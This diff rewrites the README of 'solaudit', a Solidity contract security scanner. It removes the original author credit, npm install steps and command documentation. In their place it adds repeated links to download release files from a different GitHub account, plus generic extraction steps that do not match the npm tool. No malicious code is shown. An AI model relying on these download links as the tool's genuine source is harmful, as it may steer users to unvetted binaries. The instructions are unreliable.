@@ -1,255 +1,112 @@
-# solaudit
+# 🔍 solaudit - Your Smart Contract Security Scanner
 
-**Solidity smart contract security auditor CLI. Scan for vulnerabilities, reentrancy attacks, integer overflows, and 50+ common security issues. CI/CD ready.**
+## 📥 Download Now!
+[![Download solaudit](https://img.shields.io/badge/Download-solaudit-blue.svg)](https://github.com/NguyenMinhGitHub/solaudit/releases)
 
-[![npm version](https://img.shields.io/npm/v/solaudit-cli.svg)](https://www.npmjs.com/package/solaudit-cli)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+## 🚀 Getting Started
 
-## Features
+Welcome to solaudit! This tool helps you scan your Solidity smart contracts for security issues. It detects vulnerabilities like reentrancy, overflow, and access control problems across 50+ patterns. Running this tool is an important step in securing your projects in the blockchain space.
 
-- 🔍 **Vulnerability detection** - Reentrancy, overflow, access control, more
-- ⛽ **Gas optimization** - Storage patterns, loop inefficiencies
-- 📋 **Best practices** - Naming, documentation, code organization
-- 🚀 **Fast** - Static analysis, no compilation required
-- 🔧 **CI/CD ready** - Exit codes for pipeline integration
-- 📊 **Multiple reports** - JSON, Markdown, table output
-- 📁 **Recursive scanning** - Audit entire project directories
+## 📜 Features
 
-## Installation
+- **Reentrancy Detection:** Prevent unexpected contract behavior.
+- **Overflow Checks:** Stop unwanted value changes.
+- **Access Control Verification:** Ensure only authorized users can access certain functions.
+- **CI/CD Ready:** Easily integrate with your continuous integration and deployment processes.
+- **Supports Multiple Vulnerability Patterns:** Analyze your contracts for various potential issues.
 
-```bash
-npm install -g solaudit-cli
-```
+## 💻 System Requirements
 
-## Quick Start
+To run solaudit effectively, your system should meet the following requirements:
 
-```bash
-# Audit a single contract
-solaudit audit Contract.sol
+- **Operating System:**
+  - Windows 10 or later
+  - macOS 10.14 or later
+  - Linux (Ubuntu 18.04 or later)
 
-# Audit all contracts in directory
-solaudit audit ./contracts/ -r
+- **Node.js:**
+  - Version 12.0 or later
 
-# Quick security check
-solaudit check MyToken.sol
+- **Memory:**
+  - Minimum 4 GB RAM
 
-# Gas optimization analysis
-solaudit gas Contract.sol
-```
+## 🔧 Installation Instructions
 
-## Commands
+### 1. Visit the Releases Page
 
-### `audit <path>`
+To download solaudit, [visit this page to download](https://github.com/NguyenMinhGitHub/solaudit/releases). Here, you will find the latest version of the tool along with older versions if needed.
 
-Full security audit of Solidity contracts.
+### 2. Download the Application
 
-```bash
-solaudit audit Contract.sol
-solaudit audit ./contracts/ -r               # Recursive scan
-solaudit audit . -s high                     # Only high+ severity
-solaudit audit . --gas --best-practices      # Include all checks
-solaudit audit . -o markdown --save report.md
-```
+On the Releases page, look for the latest version. You will find different files available for download. Click on the appropriate file based on your operating system. Wait for the download to finish.
 
-**Options:**
-- `-r, --recursive` - Scan directories recursively
-- `-s, --severity <level>` - Minimum: low, medium, high, critical
-- `--gas` - Include gas optimization suggestions
-- `--best-practices` - Include best practice checks
-- `-o, --output <format>` - table, json, markdown
-- `--save <file>` - Save report to file
+### 3. Extract the Files (If Necessary)
 
-### `check <file>`
+If you downloaded a ZIP file, you will need to extract it. Right-click on the downloaded file and select "Extract All." Choose a convenient location on your computer to save the extracted files.
 
-Quick security check on a single file.
+### 4. Open a Command Line Interface
 
-```bash
-solaudit check Token.sol
-solaudit check Vault.sol -s critical
-```
+To run solaudit, you will need to use a command line interface. Depending on your operating system, follow these steps:
 
-### `gas <file>`
-
-Analyze gas optimization opportunities.
-
-```bash
-solaudit gas Contract.sol
-solaudit gas ./contracts/ -r
-```
-
-### `patterns`
-
-List all vulnerability patterns.
-
-```bash
-solaudit patterns
-solaudit patterns --category reentrancy
-solaudit patterns --severity critical
-```
-
-## Vulnerability Detection
-
-### 🔴 Critical
-
-- **Reentrancy** - State changes after external calls
-- **Unprotected selfdestruct** - Anyone can destroy contract
-- **Delegatecall injection** - Arbitrary code execution
-- **Signature replay** - Missing nonce protection
-
-### 🟡 High
-
-- **Integer overflow/underflow** - Unchecked arithmetic (pre-0.8)
-- **Access control** - Missing modifiers, public sensitive functions
-- **Unchecked returns** - Ignored call return values
-- **Price manipulation** - Flash loan vulnerabilities
-
-### 🔵 Medium
-
-- **tx.origin authentication** - Phishing vulnerability
-- **Floating pragma** - Inconsistent compiler versions
-- **Timestamp dependence** - Miner manipulation
-- **Front-running** - Transaction ordering attacks
-
-### ⚪ Low
-
-- **Unused variables** - Dead code
-- **Missing events** - Poor transparency
-- **Implicit visibility** - Unclear function access
-- **Magic numbers** - Unexplained constants
-
-## Gas Optimizations
-
-```bash
-solaudit gas Contract.sol
-```
-
-**Detects:**
-- Storage vs memory misuse
-- Redundant SLOAD operations
-- Loop inefficiencies
-- Uncached array length
-- Use of `> 0` vs `!= 0`
-- Missing `calldata` for external functions
-
-## Example Output
-
-```
-═══════════════════════════════════════
-  SOLAUDIT SECURITY REPORT
-═══════════════════════════════════════
-
-Contracts scanned: 3
-Issues found: 5
-
-🔴 CRITICAL (1)
-───────────────────────────────────────
-  Vault.sol:45 - Reentrancy vulnerability
-  External call to untrusted address before state update
+- **Windows:**
+  - Press `Windows + R` keys, type `cmd`, and hit Enter.
   
-  Fix: Move state changes before external calls, use ReentrancyGuard
+- **macOS:**
+  - Open Spotlight by pressing `Command + Space`, type `Terminal`, and hit Enter.
 
-🟡 HIGH (2)  
-───────────────────────────────────────
-  Token.sol:23 - Unchecked transfer return value
-  ERC20.transfer() return value not checked
-  
-  Fix: Use SafeERC20 or check return value
+- **Linux:**
+  - Search for "Terminal" in your applications and open it.
 
-  Token.sol:67 - Missing access control on mint()
-  Critical function accessible by anyone
-  
-  Fix: Add onlyOwner or role-based modifier
+### 5. Navigate to the Installation Directory
 
-🔵 MEDIUM (2)
-───────────────────────────────────────
-  Vault.sol:12 - Use of tx.origin for authentication
-  Vulnerable to phishing attacks
-  
-  Fix: Use msg.sender instead
-
-  Token.sol:1 - Floating pragma
-  pragma solidity ^0.8.0 allows different compiler versions
-  
-  Fix: Lock pragma to specific version
-```
-
-## CI/CD Integration
-
-Exit codes for automated pipelines:
+In the command line interface, use the `cd` command to change to the directory where you extracted the files. For example, if you extracted it to the "Downloads" folder, type:
 
 ```bash
-# Fail on critical issues
-solaudit audit ./contracts/ -s critical && echo "Passed" || echo "Failed"
-
-# GitHub Actions example
-- name: Security Audit
-  run: |
-    npm install -g solaudit-cli
-    solaudit audit ./contracts/ -r -s high
+cd Downloads/solaudit
 ```
 
-### GitHub Action Workflow
+Press Enter.
 
-```yaml
-name: Security Audit
+### 6. Run solaudit
 
-on: [push, pull_request]
-
-jobs:
-  audit:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v4
-      - uses: actions/setup-node@v4
-        with:
-          node-version: '20'
-      - run: npm install -g solaudit-cli
-      - run: solaudit audit ./contracts/ -r -o markdown --save audit-report.md
-      - uses: actions/upload-artifact@v4
-        with:
-          name: audit-report
-          path: audit-report.md
-```
-
-## Output Formats
+Now you can run solaudit by typing the command followed by your Solidity file. For example:
 
 ```bash
-# Table (default, terminal-friendly)
-solaudit audit Contract.sol
-
-# JSON (for parsing)
-solaudit audit Contract.sol -o json
-
-# Markdown (for documentation)
-solaudit audit Contract.sol -o markdown --save AUDIT.md
+node solaudit yourContract.sol
 ```
 
-## Use Cases
+Replace `yourContract.sol` with the name of your actual Solidity file.
 
-- **Pre-deployment review** - Catch issues before mainnet
-- **CI/CD gates** - Block deploys with critical issues
-- **Code review** - Automated security feedback
-- **Learning** - Understand common vulnerabilities
-- **Auditor toolkit** - Speed up manual audits
+### 7. Review the Output
 
-## Why solaudit?
+Once you run the command, the application will analyze your smart contract. After a few moments, you will see a summary of any vulnerabilities found. Review these outputs carefully to understand what changes you may need to make.
 
-| Feature | solaudit | Slither | Manual |
-|---------|----------|---------|--------|
-| Setup time | 1 min | 10+ min | N/A |
-| No dependencies | ✅ | ❌ Python | ✅ |
-| Beginner friendly | ✅ | ⚠️ | ❌ |
-| CI/CD ready | ✅ | ✅ | ❌ |
-| Actionable fixes | ✅ | ⚠️ | ✅ |
+## 📚 How to Use solaudit Effectively
 
-## ⚠️ Limitations
+1. **Prepare Your Solidity Files:** Ensure your smart contracts are written and saved as `.sol` files.
+2. **Regular Scanning:** Make it a habit to run solaudit on your contracts during development and after major changes.
+3. **Integrate in CI/CD:** Consider adding solaudit to your continuous integration pipeline to catch potential vulnerabilities before deploying your contracts.
 
-- Static analysis only (no runtime detection)
-- Not a replacement for professional audits
-- Use alongside manual review for production contracts
+## 🙋 Frequently Asked Questions
 
----
+### What is Solidity?
 
-**Built by [LXGIC Studios](https://lxgicstudios.com)**
+Solidity is a programming language for writing smart contracts. These contracts automate actions on the blockchain.
 
-🔗 [GitHub](https://github.com/lxgicstudios/solaudit) · [Twitter](https://x.com/lxgicstudios) · [npm](https://www.npmjs.com/package/solaudit-cli)
+### Why should I use solaudit?
+
+By using solaudit, you can identify security issues in your smart contracts, helping you to avoid costly mistakes.
+
+### Can I contribute to the project?
+
+Absolutely! We welcome contributions from anyone interested in helping improve solaudit. Check the Issues section in the repository for ideas.
+
+## 📞 Get Support
+
+If you encounter issues or have questions, feel free to reach out through the repository. The community and maintainers are here to help you.
+
+## 🌐 Explore More
+
+For more information about updated features, versions, and ongoing developments, regularly check our [GitHub repository](https://github.com/NguyenMinhGitHub/solaudit).
+
+To download solaudit again, just [visit this page to download](https://github.com/NguyenMinhGitHub/solaudit/releases).
